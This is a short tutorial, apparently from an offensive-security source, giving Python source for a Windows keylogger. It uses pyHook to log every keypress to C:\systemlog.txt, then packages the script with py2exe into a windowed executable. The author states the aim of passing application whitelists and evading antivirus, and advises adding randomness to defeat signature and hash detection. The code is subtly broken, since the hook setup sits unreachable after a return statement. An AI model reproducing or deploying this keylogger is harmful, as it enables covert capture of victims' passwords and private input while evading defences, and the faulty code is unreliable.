# Python Keylogger
# Everyone uses different types of keyloggers and this is no different. My goal was to develop
# something that would most likely be accepted on white-listed application lists and be able to run
# undetected by AV. Included below is simple code to have python start recording all keyboard
# presses:{46}
import pyHook, pythoncom, sys, logging

file_log = 'C:\\systemlog.txt'

def OnKeyboardEvent(event):
	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
	chr(event.Ascii)
	logging.log(10, chr(event.Ascii))
	return True
	hooks_manager = pyHook.HookManager()
	hooks_manager.KeyDown = OnKeyboardEvent
	hooks_manager.HookKeyboard()
	pythoncom.PumpMessages()


# Here is my setup.py file

from distutils.core import setup
import py2exe

setup(options = {'py2exe': {'bundle_files': 1, 'compressed': True}},windows = [{'script': "logger.py"}],zipfile = None)
# And using py2exe, I will convert the python script to an executable with the following commands:
# python.exe setup.py install
# python.exe setup.py py2exe
# Now I will have an executable binary of the keylogger that records all keystrokes and stores all of the
# key strokes to C:\systemlog.txt. Pretty simple and easy and AV never detected it. If you need to, you
# may add some randomness in there to make sure that it isn't picked up by signatures or hash matching.